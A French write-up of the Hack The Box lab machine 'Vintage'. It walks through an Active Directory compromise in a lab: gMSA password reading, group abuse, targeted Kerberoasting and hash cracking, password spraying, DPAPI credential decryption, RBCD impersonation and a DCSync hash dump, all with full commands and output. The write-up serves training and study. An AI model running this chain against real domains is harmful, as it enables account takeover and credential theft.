---
title: Vintage
date: 2025-12-11 10:28:41
categories: ["Writeups", "Hackthebox", "Machines"]
tags: ["Hard", "Windows", "Active Directory"]
---

Vintage est une machine Windows de difficulté élevée conçue autour d'un scénario de compromission initiale, où l'attaquant reçoit des identifiants utilisateur à faibles privilèges. La machine présente un environnement Active Directory sans ADCS installé, et l'authentification NTLM est désactivée. Il existe un `compte machine pré-créé`, signifiant que le mot de passe est identique au `sAMAccountName` du compte machine. L'unité organisationnelle (OU) `Domain Computer` a une configuration permettant aux attaquants de lire le mot de passe du compte de service, qui a gMSA configuré. Après avoir obtenu le mot de passe, le compte de service peut s'ajouter à un groupe privilégié. Ce groupe a un contrôle total sur un utilisateur désactivé. L'attaquant doit restaurer l'utilisateur désactivé et définir un `Service Principal Name` (SPN) pour effectuer du `Kerberoasting`. Après récupération du mot de passe, le compte utilisateur a réutilisé le même mot de passe. L'utilisateur nouvellement compromis a un mot de passe stocké dans le Gestionnaire d'identifiants. L'utilisateur peut s'ajouter à un autre groupe privilégié configuré pour la `Délégation Contrainte Basée sur les Ressources` (RBCD) sur le contrôleur de domaine, permettant à l'attaquant de le compromettre.

## Enumération
### Scan de ports
Le scan `nmap` révèle 18 ports ouverts : `DNS`, `Kerberos`, `SMB`, `LDAP`, `WinRM` ainsi que d'autres ports Windows.
```bash
╭─root@exegol-hackthebox /workspace/Vintage
╰─➤  nmap 10.129.231.205 -T4 --min-rate 1000 -sV -sC -vv -p- -oN full-tcp-scan.txt

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-07-23 07:55:16Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49676/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49685/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
52879/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 0s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 57219/tcp): CLEAN (Timeout)
|   Check 2 (port 22961/tcp): CLEAN (Timeout)
|   Check 3 (port 59940/udp): CLEAN (Timeout)
|   Check 4 (port 17035/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time:
|   date: 2025-07-23T07:56:08
|_  start_date: N/A
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
```

J'ajoute le nom de domaine ainsi que le FQDN dans le fichier `/etc/hosts`.
```bash
echo "10.129.231.205 vintage.htb dc01.vintage.htb dc01" | tee -a /etc/hosts
```

### SMB - TCP 445
L'authentification NTLM est désactivée.
```bash
╭─root@exegol-hackthebox /workspace/Vintage
╰─➤  nxc smb 10.129.231.205 -u 'p.rosa' -p 'Rosaisbest123'                                                                                130 ↵
SMB         10.129.231.205  445    10.129.231.205   [*]  x64 (name:10.129.231.205) (domain:10.129.231.205) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.129.231.205  445    10.129.231.205   [-] 10.129.231.205\p.rosa:Rosaisbest123 STATUS_NOT_SUPPORTED
```

J'utilise alors l'option `-k` pour l'authentification Kerberos et générer un nouveau fichier `/etc/krb5.conf`.
```bash
╭─root@exegol-hackthebox /workspace/Vintage
╰─➤  nxc smb dc01.vintage.htb -u 'p.rosa' -p 'Rosaisbest123' -k --generate-krb5-file /etc/krb5.conf
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\p.rosa:Rosaisbest123
╭─root@exegol-hackthebox /workspace/Vintage
╰─➤  cat /etc/krb5.conf

[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = VINTAGE.HTB

[realms]
    VINTAGE.HTB = {
        kdc = dc01.vintage.htb
        admin_server = dc01.vintage.htb
        default_domain = vintage.htb
    }

[domain_realm]
    .vintage.htb = VINTAGE.HTB
    vintage.htb = VINTAGE.HTB
```

Je ne vois aucun partage particulier auquel `p.rosa` aurait accès.
```bash
╭─root@exegol-hackthebox /workspace/Vintage
╰─➤  nxc smb dc01.vintage.htb -u 'p.rosa' -p 'Rosaisbest123' -k --shares
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\p.rosa:Rosaisbest123
SMB         dc01.vintage.htb 445    dc01             [*] Enumerated shares
SMB         dc01.vintage.htb 445    dc01             Share           Permissions     Remark
SMB         dc01.vintage.htb 445    dc01             -----           -----------     ------
SMB         dc01.vintage.htb 445    dc01             ADMIN$                          Remote Admin
SMB         dc01.vintage.htb 445    dc01             C$                              Default share
SMB         dc01.vintage.htb 445    dc01             IPC$            READ            Remote IPC
SMB         dc01.vintage.htb 445    dc01             NETLOGON        READ            Logon server share
SMB         dc01.vintage.htb 445    dc01             SYSVOL          READ            Logon server share
```

## Shell en tant que C.Neri
### BloodHound
Je génère alors un TGT pour `p.rosa` et je l'exporte dans le fichier `KRB5CCNAME`.
```bash
╭─root@exegol-hackthebox /workspace/Vintage
╰─➤  getTGT.py 'vintage.htb/p.rosa:Rosaisbest123'                                                                                         130 ↵
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in p.rosa.ccache
╭─root@exegol-hackthebox /workspace/Vintage
╰─➤  export KRB5CCNAME=p.rosa.ccache
╭─root@exegol-hackthebox /workspace/Vintage
╰─➤  klist
Ticket cache: FILE:p.rosa.ccache
Default principal: p.rosa@VINTAGE.HTB

Valid starting       Expires              Service principal
07/23/2025 10:29:09  07/23/2025 20:29:09  krbtgt/VINTAGE.HTB@VINTAGE.HTB
        renew until 07/24/2025 10:29:09
```

J'utilise l'option `--bloodhound` pour récupérer les relations entres les objets du domaine.
```bash
╭─root@exegol-hackthebox /workspace/Vintage
╰─➤  nxc ldap dc01.vintage.htb -u 'p.rosa' -p 'Rosaisbest123' -k --bloodhound -c All --dns-server 10.129.231.205
LDAP        dc01.vintage.htb 389    DC01             [*] None (name:DC01) (domain:vintage.htb)
LDAP        dc01.vintage.htb 389    DC01             [+] vintage.htb\p.rosa:Rosaisbest123
LDAP        dc01.vintage.htb 389    DC01             Resolved collection methods: session, trusts, acl, rdp, objectprops, psremote, container, localadmin, dcom, group
LDAP        dc01.vintage.htb 389    DC01             Using kerberos auth without ccache, getting TGT
LDAP        dc01.vintage.htb 389    DC01             Done in 00M 09S
LDAP        dc01.vintage.htb 389    DC01             Compressing output into /root/.nxc/logs/DC01_dc01.vintage.htb_2025-07-23_101054_bloodhound.zip
```

Je vois que dans le groupe `Domain Computers`, il y a `fs01$` qui est membre du groupe `Pre Windows 2000 Compatible Access`. Donc son mot de passe est `fs01`. Plus d'informations sur ce groupe sur [thehackerrecipes](https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers#practice). Il peut aussi lire les mot de passe GMSA. La machine gms01$ peut s'ajouter dans le groupe `SERVICEMANAGERS`. Les membres de ce groupe ont le droit `GenericAll` sur les comptes de service, donc peuvent récupérer les hash de ces comptes.
![](/images/Vintage/Vintage-1.png)

Je vois aussi que le groupe `SERVICEMANAGERS` contient trois membres.
![](/images/Vintage/Vintage-3.png)

Je vois aussi que parmi les comptes de service, seul `svc_sql` est désactivé. Donc il devrait avoir comme valeur `ACCOUNTDISABLE` pour la propriété `userAccountControl`.

![](/images/Vintage/Vintage-2.png)

Le chemin d'attaque est le suivant :
1. Récupérer les identifiants GMSA
2. Ajouter le compte `gmsa01$` dans le groupe `SERVICEMANGERS`
3. Activer le compte `svc_sql`
4. `Targeted Kerberoast` sur les membres du groupe `SERVICEMANAGERS`

### Récupérer les GMSA
Confirmation des identifiants `fs01$:fs01`.
```bash
╭─root@exegol-hackthebox /workspace/Vintage
╰─➤  nxc smb dc01.vintage.htb -u 'fs01$' -p 'fs01' -k                                                                                       1 ↵
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\fs01$:fs01
```

Je génère alors un ticket pour `fs01$`.
```bash
╭─root@exegol-hackthebox /workspace/Vintage
╰─➤  getTGT.py 'vintage.htb/fs01$:fs01'
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in fs01$.ccache
╭─root@exegol-hackthebox /workspace/Vintage
╰─➤  export KRB5CCNAME=fs01\$.ccache
╭─root@exegol-hackthebox /workspace/Vintage
╰─➤  klist
Ticket cache: FILE:fs01$.ccache
Default principal: fs01$@VINTAGE.HTB

Valid starting       Expires              Service principal
07/23/2025 10:52:16  07/23/2025 20:52:16  krbtgt/VINTAGE.HTB@VINTAGE.HTB
        renew until 07/24/2025 10:52:15
```

Je récupère les identifiants GMSA avec `bloodyAD`.
```bash
╭─root@exegol-hackthebox /workspace/Vintage
╰─➤  bloodyAD --host 'dc01.vintage.htb' --dc-ip '10.129.231.205' -d 'vintage.htb' -k get object 'GMSA01$' --attr msDS-ManagedPassword       1 ↵

distinguishedName: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:5008d30496b4c5069ce1fc187b5b5960
msDS-ManagedPassword.B64ENCODED: bf1cBrHgnrALWx1WFDnvyHlBZcnkH+3VWYL4yBPdXcXgE7ENWHpWc03uhzxvXLrT5eh71spfFnajFbFuYuHCk2bczzZnBOeruwpF5vpYWmmULhBQoBvyxVWvr2MwOcHOyS7LQYMZdAlJ8k0Dg/2J3ie5SJFNM+Sb7M+Nx+zLSG3A7lYcdYcLS5ed0D8jw1TFB4g4+S0pqNRMjXp2b3HpJbHBFnn6wTDKrDiOZaG/DJHDODoCG0oAncE43Rtpf5lve49jd+m8QGqbQXmQEqCTH/CPS5/n6TKQgqzIMyE8LaxMK3s4UXJAbh8wlskq7j27jD61W7V0JMeMT/dvQu20Jg==
```

Je génère un TGT pour `gmsa01$`.
```bash
╭─root@exegol-hackthebox /workspace/Vintage
╰─➤  getTGT.py 'vintage.htb/gmsa01$' -hashes ':5008d30496b4c5069ce1fc187b5b5960'
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in gmsa01$.ccache
╭─root@exegol-hackthebox /workspace/Vintage
╰─➤  export KRB5CCNAME=gmsa01\$.ccache
╭─root@exegol-hackthebox /workspace/Vintage
╰─➤  klist
Ticket cache: FILE:gmsa01$.ccache
Default principal: gmsa01$@VINTAGE.HTB

Valid starting       Expires              Service principal
07/23/2025 11:05:20  07/23/2025 21:05:20  krbtgt/VINTAGE.HTB@VINTAGE.HTB
        renew until 07/24/2025 11:05:20
```

### Ajouter gmsa01$ dans le groupe SERVICEMANAGERS
J'ajoute `gmsa01$` dans le groupe `SERVICEMANAGERS`.
```bash
╭─root@exegol-hackthebox /workspace/Vintage
╰─➤  bloodyAD --host 'dc01.vintage.htb' --dc-ip '10.129.231.205' -d 'vintage.htb' -k add groupMember 'SERVICEMANAGERS' 'gmsa01$'
[+] gmsa01$ added to SERVICEMANAGERS
```

### Activer svc_sql
Avec `bloodyAD`, je retire la valeur `ACCOUNTDISABLE` de la propriété `userAccountControl` de `svc_sql`, ce qui le le réactive.
```bash
╭─root@exegol-hackthebox /workspace/Vintage
╰─➤  bloodyAD --host 'dc01.vintage.htb' --dc-ip '10.129.231.205' -d 'vintage.htb' -k remove uac 'svc_sql' -f ACCOUNTDISABLE
[-] ['ACCOUNTDISABLE'] property flags removed from svc_sql's userAccountControl
```

Je vérifie avec `bloodyAD`.
```bash
╭─root@exegol-hackthebox /workspace/Vintage
╰─➤  bloodyAD --host 'dc01.vintage.htb' --dc-ip '10.129.231.205' -d 'vintage.htb' -k get object 'svc_sql'

distinguishedName: CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb
<snip>
userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
whenChanged: 2025-07-23 09:38:23+00:00
whenCreated: 2024-06-06 13:45:27+00:00
```

### Targeted Kerberoasting
Ensuite avec le ticket de `gmsa01$`, je récupère les hash des comptes `svc`.
```bash
╭─root@exegol-hackthebox /workspace/Vintage
╰─➤  targetedKerberoast.py -v -d 'vintage.htb' -k --no-pass --dc-host dc01.vintage.htb -o Kerberoastables.txt
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (svc_sql)
[+] Writing hash to file for (svc_sql)
[VERBOSE] SPN removed successfully for (svc_sql)
[VERBOSE] SPN added successfully for (svc_ldap)
[+] Writing hash to file for (svc_ldap)
[VERBOSE] SPN removed successfully for (svc_ldap)
[VERBOSE] SPN added successfully for (svc_ark)
[+] Writing hash to file for (svc_ark)
[VERBOSE] SPN removed successfully for (svc_ark)
```

Je crack alors les hash et je trouve le mot de passe `Zer0the0ne` de `svc_sql`.
```bash
╭─root@exegol-hackthebox /workspace/Vintage
╰─➤  hashcat -m 13100 Kerberoastables.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-AMD Ryzen 7 5825U with Radeon Graphics, 2749/5562 MB (1024 MB allocatable), 16MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashfile 'Kerberoastables.txt' on line 1 ($krb5t...a87e1904439bb6c146f450a58074b085): Separator unmatched
Hashes: 3 digests; 3 unique digests, 3 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 4 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 1 sec

$krb5tgs$23$*svc_sql$VINTAGE.HTB$vintage.htb/svc_sql*$6bbb6a170a087629ea84c5628d7addff$9db130be92574ac5467f33ccc54dceecf839702aae9784c8c49deeeacbdfc954ef10bcdabaf19a034f7ba3e6042958d64eaef2d48f47d5261ae15b1376ed4a83b4022ff080abdbe89f72ca58b75df2c8d0f32621d71a754f524b529078015eab12d6173c459a709fa21debcc6ad25fa1c022565d8c26aaa7bf6ba7627e9ff6c83880b697c42ffc61e5646960e572d5b69fbaaa309c0bcd77206b6b10a08483cb33ba11bc881d8dcce49ca0dcd8c0e8345e0b3dedb87ea52c1023f424135f7509caa8cbbf1f1ba73abef341fef51c598e6b2931469c5951cde5e58c26c3aa13e0d357f6224340d4b1c653abfc3426fc44deab78469b0db8a253ce8ecddf0e8e10fd5048e3e8d3f356ef7a222f4a184bce0869174360f1a75aa622d4827c88763cb00b7b1f0584934ba49a6d494a7c93e5ad7dd8a689ca07a921598e32cf2ef25ca7aff9944d29d806275ced71938e5d3aad0f701eef40ef000f7a013433b16838d4893c61f5e9a8c8a8f5295121967c6c4c8bb5cb3e8283191a56972c8da6af2383416c2fed19f01a7628b56752c8719d8d2f1073e6c9496e3b6edd76fe88d1b725d5a8dd662514b1db9d2459c4890d0d1554f53e978d196c8241012c162b1eb71e0006e94e0a4acbe6aced6ffcfd4de510b832d6c3d6c65ac0152275b81e2fea40c4b4faff9477837965e8e6ee21e4ae870c21fe833e648d740f523b241c7b023e9723b3e9a999cf8dcac0643aa8b30c889c40d0b6fa6aab2f03cb92d35699800ebdff1f8295d95473e8b073ef04897a5755c290bc339efda81012ca07405ec3b79820429a5b6ff086f6541b2bf6c34eb642a6f0710e15a58def9caf59faf09a7b798398911c605cb403490b440ff361f00e68307265656963dc4e0217420a174950ede175bb5383415cd818a34876ea884803f53d0b93e055c7cb3cfb983e6b44b0b958fb81681c89c2aea8adbd8548448cc8319abad101b7872df2ab478e6f83687821bbb5da97b8f6245f734e1f82a41930d05a4e055fa48b25001d06d3dfdf8a5e5a384dcd29765a6fa6e60cec322735a9379dccf1ec66978160a388d8e0dca8722ec8bd5f2e2f2c5297107bc879e52760b1df92481b94454a1d2fe04cbe3a6babf65c6b5c3f9b0e5b8a4c80cf2a24fcf29842d30b09c6c6fe7a0cb3407c545168fb027cfb74895466a943d4ffced1943ae17064a1bb9062daa42a27df5f7bc45677fcb6685a81f956bfb9b21c8f30b698e27996c0bf7451b33a7a3476e986c93d9242bb35ed5cc021ef57952130bc0d0152c69b855b9397b76cb3bf4197215af41989a78f4d6148f3f99eb83b023340c3f1602c2b4c716ba9e3b9544284e4252c45b062b2bdb885a0e2fb3b7ac4d13caf93780f35ca788bc0bf29bdb71d86ee8385d84bb9440d88a18a6c0e1bfb531168bd5eac023f676cdac2441b6f760b46eb:Zer0the0ne
```

### Password Spray
Ensuite je teste le mot de passe sur tous les utilisateurs du domaine. Je vois alors que `C.Neri` utilise ce mot de passe.
```bash
╭─root@exegol-hackthebox /workspace/Vintage
╰─➤  nxc smb dc01.vintage.htb -u users.txt -p 'Zer0the0ne' -k --continue-on-success                                                         1 ↵
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\Administrator:Zer0the0ne KDC_ERR_PREAUTH_FAILED
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\Guest:Zer0the0ne KDC_ERR_CLIENT_REVOKED
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\krbtgt:Zer0the0ne KDC_ERR_CLIENT_REVOKED
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\M.Rossi:Zer0the0ne KDC_ERR_PREAUTH_FAILED
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\R.Verdi:Zer0the0ne KDC_ERR_PREAUTH_FAILED
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\L.Bianchi:Zer0the0ne KDC_ERR_PREAUTH_FAILED
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\G.Viola:Zer0the0ne KDC_ERR_PREAUTH_FAILED
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\C.Neri:Zer0the0ne
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\P.Rosa:Zer0the0ne KDC_ERR_PREAUTH_FAILED
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\svc_sql:Zer0the0ne KDC_ERR_CLIENT_REVOKED
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\svc_ldap:Zer0the0ne KDC_ERR_PREAUTH_FAILED
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\svc_ark:Zer0the0ne KDC_ERR_PREAUTH_FAILED
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\C.Neri_adm:Zer0the0ne KDC_ERR_PREAUTH_FAILED
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\L.Bianchi_adm:Zer0the0ne KDC_ERR_PREAUTH_FAILED
```

Je vois que `C.Neri` est un membre du groupe `Remote Management Users`, donc je veux obtenir un shell avec lui.
![](/images/Vintage/Vintage-4.png)

Je génère alors un ticket pour `c.neri` et me connecte avec `evil-winrm`.
```bash
╭─root@exegol-hackthebox /workspace/Vintage
╰─➤  getTGT.py 'vintage.htb/c.neri:Zer0the0ne'
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in c.neri.ccache
╭─root@exegol-hackthebox /workspace/Vintage
╰─➤  export KRB5CCNAME=c.neri.ccache
╭─root@exegol-hackthebox /workspace/Vintage
╰─➤  klist
Ticket cache: FILE:c.neri.ccache
Default principal: c.neri@VINTAGE.HTB

Valid starting       Expires              Service principal
07/23/2025 11:55:24  07/23/2025 21:55:24  krbtgt/VINTAGE.HTB@VINTAGE.HTB
        renew until 07/24/2025 11:55:24
╭─root@exegol-hackthebox /workspace/Vintage
╰─➤  evil-winrm -i dc01.vintage.htb -r vintage.htb

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\C.Neri\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\C.Neri\Desktop> type user.txt
c0617257952b3dd449ae73328eb67d8d
```

## Shell en tant que l.bianchi_adm
### Obtention de c.neri_adm
#### DPAPI
Je télécharge les identifiants.
```bash
*Evil-WinRM* PS C:\Users\c.neri\AppData\Local\Microsoft\Credentials> dir -force


    Directory: C:\Users\c.neri\AppData\Local\Microsoft\Credentials


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          6/7/2024   1:17 PM          11020 DFBE70A7E5CC19A398EBF1B96859CE5D


*Evil-WinRM* PS C:\Users\c.neri\AppData\Local\Microsoft\Credentials> download DFBE70A7E5CC19A398EBF1B96859CE5D

*Evil-WinRM* PS C:\Users\c.neri\AppData\Roaming\Microsoft\Credentials> ls -force


    Directory: C:\Users\c.neri\AppData\Roaming\Microsoft\Credentials


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          6/7/2024   5:08 PM            430 C4BB96844A5C9DD45D5B6A9859252BA6

*Evil-WinRM* PS C:\Users\c.neri\AppData\Roaming\Microsoft\Credentials> download C4BB96844A5C9DD45D5B6A9859252BA6

```

Je télécharge ensuite la masterkey.
```bash
*Evil-WinRM* PS C:\Users\c.neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115> dir -force


    Directory: C:\Users\c.neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          6/7/2024   1:17 PM            740 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
-a-hs-          6/7/2024   1:17 PM            740 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
-a-hs-          6/7/2024   1:17 PM            904 BK-VINTAGE
-a-hs-          6/7/2024   1:17 PM             24 Preferred


*Evil-WinRM* PS C:\Users\c.neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115> download 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
*Evil-WinRM* PS C:\Users\c.neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115> download 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
```

Ensuite sur ma machine, je déchiffre la masterkey.
```bash
╭─root@exegol-hackthebox /workspace/Vintage
╰─➤ dpapi.py masterkey -file 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525
```

Puis à l'aide de la clé, je déchiffre le contenu du fichier contenant les données. S'y trouvent les identifiants de `c.neri_adm`.
```bash
╭─root@exegol-hackthebox /workspace/Vintage
╰─➤ dpapi.py credential -file C4BB96844A5C9DD45D5B6A9859252BA6 -key '0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a'
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

[CREDENTIAL]
LastWritten : 2024-06-07 15:08:23+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000001 (CRED_TYPE_GENERIC)
Target      : LegacyGeneric:target=admin_acc
Description :
Unknown     :
Username    : vintage\c.neri_adm
Unknown     : Uncr4ck4bl3P4ssW0rd0312
```

### RCBD
Je vois que `c.neri_adm` est membre du groupe `DELEGATEDADMINS` qui possède le droit `AllowedToAct`. Ce qui lui permet de faire une RCBD. Cet article de [thehackerrecipes](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd#rbcd-on-spn-less-users) explique très bien cette attaque. Pour réaliser cette attaque il faut un utilisateur avec un `servicePrinpalName`(SPN) ou un compte machine. `c.neri_adm` n'a pas de SPN mais possède le droit `GenericWrite` sur ce groupe, donc il peut ajouter n'importe quel compte dans ce groupe. Donc j'ajouterai le compte machine fs01$ dans le groupe `DELAGATEDADMINS` pour réaliser cette attaque.
![](/images/Vintage/Vintage-5.png)

Donc avec `netxec` je vérifie que `c.neri_adm` a bien le droit pour faire une RCBD.
```bash
╭─root@exegol-hackthebox /workspace/Vintage
╰─➤  nxc ldap dc01.vintage.htb -u 'c.neri_adm' -p 'Uncr4ck4bl3P4ssW0rd0312' -k --trusted-for-delegation
LDAP        dc01.vintage.htb 389    DC01             [*] None (name:DC01) (domain:vintage.htb)
LDAP        dc01.vintage.htb 389    DC01             [+] vintage.htb\c.neri_adm:Uncr4ck4bl3P4ssW0rd0312
LDAP        dc01.vintage.htb 389    DC01             DC01$
```

Ensuite j'ajoute le compte machine `fs01$` dans le groupe `DELEGATEDADMINS`.
```bash
╭─root@exegol-hackthebox /workspace/Vintage
╰─➤  bloodyAD --host 'dc01.vintage.htb' --dc-ip '10.129.231.205' -d 'vintage.htb' -k add groupMember 'DELEGATEDADMINS' 'fs01$'              1 ↵
[+] fs01$ added to DELEGATEDADMINS
```

Puis je génère un ticket pour `fs01$` et je fais une demande de ticket de service en usurpant l'identité de `l.bianchi_adm` qui est un membre du groupe `Domain Admins`. Cela n'a pas fonctionné lorsque j'ai essayé d'usurper l'identité de l'utilisateur `administrator`.
```bash
╭─root@exegol-hackthebox /workspace/Vintage
╰─➤  getTGT.py 'vintage.htb/fs01$:fs01'                                                                                                   130 ↵
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in fs01$.ccache
╭─root@exegol-hackthebox /workspace/Vintage
╰─➤  export KRB5CCNAME=fs01\$.ccache

╭─root@exegol-hackthebox /workspace/Vintage
╰─➤  getST.py -spn 'cifs/dc01.vintage.htb' -k -impersonate 'l.bianchi_adm' 'vintage.htb/fs01$:fs01'
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

[*] Impersonating l.bianchi_adm
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in l.bianchi_adm@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache
```

### DCSync
J'utilise `secretsdump` pour obtenir les hash des utilisateurs du domaine.
```bash
╭─root@exegol-hackthebox /workspace/Vintage
╰─➤  secretsdump -k -no-pass 'vintage.htb/l.bianchi_adm@dc01.vintage.htb'                                                                 130 ↵
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies
<snip>
Administrator:500:aad3b435b51404eeaad3b435b51404ee:468c7497513f8243b59980f2240a10de:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:be3d376d906753c7373b15ac460724d8:::
M.Rossi:1111:aad3b435b51404eeaad3b435b51404ee:8e5fc7685b7ae019a516c2515bbd310d:::
R.Verdi:1112:aad3b435b51404eeaad3b435b51404ee:42232fb11274c292ed84dcbcc200db57:::
L.Bianchi:1113:aad3b435b51404eeaad3b435b51404ee:de9f0e05b3eaa440b2842b8fe3449545:::
